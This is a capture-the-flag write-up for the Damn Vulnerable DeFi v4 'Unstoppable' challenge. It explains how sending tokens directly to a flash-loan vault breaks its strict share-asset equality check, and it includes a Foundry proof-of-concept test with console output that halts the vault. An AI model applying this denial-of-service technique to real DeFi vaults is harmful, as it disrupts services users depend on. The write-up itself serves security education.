# Unstoppable — Damn Vulnerable DeFi v4 Challenge

**Author:** 0xmaurice

**Date:** November 11, 2025

**Challenge:** Damn Vulnerable DeFi v4 — *Unstoppable*

**Objective:** Demonstrate how it’s possible to halt the vault and stop it from offering flash loans.

---

## Summary

Sending underlying tokens directly to the vault (bypassing the `deposit` function) increases `vault.totalAssets()` without minting new shares. The vault enforces a strict equality check between its total shares and total assets before issuing flash loans. When this check fails, `flashLoan()` reverts. The `UnstoppableMonitor` contract detects this failure and pauses the vault.

---

## Scope & Setup

- **UnstoppableVault.sol**

  - Implements ERC-4626 (tokenized vault) and ERC-3156 (flash lender).
  - Holds 1,000,000 DVT tokens in deposits.
- **UnstoppableMonitor.sol**

  - Observes the vault’s flash loan functionality.
  - Pauses the vault when a flash loan attempt reverts.
- **Player account**

  - Starts with a 10 DVT token balance.

Goal: Reach a state where the vault’s flash loan feature becomes non-functional, triggering the monitor to pause it.

---

## Thought Process

To stop the vault from offering flash loans, we must understand what conditions cause `flashLoan()` to revert. The vault can only be paused by its `owner` through `setPause()`, which regular users can’t access directly. However, `UnstoppableMonitor` can call `setPause(true)` automatically when `vault.flashLoan()` reverts.

### UnstoppableMonitor:checkFlashLoan()

```solidity
function checkFlashLoan(uint256 amount) external onlyOwner {
    require(amount > 0);
    address asset = address(vault.asset());

    try vault.flashLoan(this, asset, amount, bytes("")) {
        emit FlashLoanStatus(true);
    } catch {
        emit FlashLoanStatus(false);
        vault.setPause(true);
        vault.transferOwnership(owner);
    }
}
```

### UnstoppableVault:flashLoan()

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (amount == 0) revert InvalidAmount(0);
    if (address(asset) != _token) revert UnsupportedCurrency();

    uint256 balanceBefore = totalAssets();
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

    ERC20(_token).safeTransfer(address(receiver), amount);

    uint256 fee = flashFee(_token, amount);
    if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
        != keccak256("IERC3156FlashBorrower.onFlashLoan")) revert CallbackFailed();

    ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
    ERC20(_token).safeTransfer(feeRecipient, fee);

    return true;
}
```

There are three main checks that can cause a revert:

1. **InvalidAmount:** Never triggered by `UnstoppableMonitor`, since it requires `amount > 0`.
2. **UnsupportedCurrency:** Never triggered, since the monitor always uses the correct `vault.asset()`.
3. **InvalidBalance:** The critical check. If `convertToShares(totalSupply) != totalAssets()`, the function reverts.

---

## Proof of Concept (PoC)

If a user transfers tokens directly to the vault, `totalAssets()` increases while `totalSupply()` remains unchanged. This leads to a failed equality check and a reverted flash loan.

### Foundry Test Example

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    console.log("Vault balances before transfer:");
    console.log("totalAssets:", vault.totalAssets());
    console.log("totalShares:", vault.totalSupply());

    console.log("\nTransferring tokens to vault...\n");
    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);

    console.log("Vault balances after transfer:");
    console.log("totalAssets:", vault.totalAssets());
    console.log("totalShares:", vault.totalSupply());

    console.log("\nAfter transferring tokens, assets > shares. The next flash loan reverts, causing the monitor to pause the vault.\n");
}
```

### Console Output

```
Logs:
  Vault balances before transfer:
  totalAssets: 1000000000000000000000000
  totalShares: 1000000000000000000000000
  
Transferring tokens to vault...

  Vault balances after transfer:
  totalAssets: 1000010000000000000000000
  totalShares: 1000000000000000000000000
  
After transferring tokens, assets > shares. The next flash loan reverts, causing the monitor to pause the vault.
```

Result: `flashLoan()` reverts with `InvalidBalance`, and `UnstoppableMonitor.checkFlashLoan()` pauses the vault.

---

## Explanation

When DVT tokens are transferred directly to the vault, `totalAssets()` reflects the new token balance, but no new shares are minted. This breaks the strict invariant `convertToShares(totalSupply) == totalAssets()`, causing `InvalidBalance()` to trigger and halting flash loans.

---

## Root Cause

The vault enforces an unrealistically strict invariant between its raw token balance and its accounting-based share supply. Direct ERC-20 transfers to the vault increase `totalAssets()` without corresponding share mints, making the check fail.

---

## References

* [Damn Vulnerable DeFi Website](https://www.damnvulnerabledefi.xyz/)
* [Damn Vulnerable DeFi GitHub Repository](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0)
* [ERC-4626 Specification](https://eips.ethereum.org/EIPS/eip-4626)
* [ERC-3156 Specification](https://eips.ethereum.org/EIPS/eip-3156)

---

## Environment

* Solidity: `0.8.25`
* Framework: Foundry
* Challenge commit: `v4.1.0`

---

**Key Takeaway:**
*A single external ERC-20 transfer can break a vault’s internal accounting if strict equality is enforced between raw balances and shares. ERC-4626 vaults should be designed to tolerate or reconcile such discrepancies.*

---

*Note:* All research, code, and technical explanations were written by **0xmaurice**. Only sentence structure and grammar were reviewed and refined with the help of **ChatGPT**.
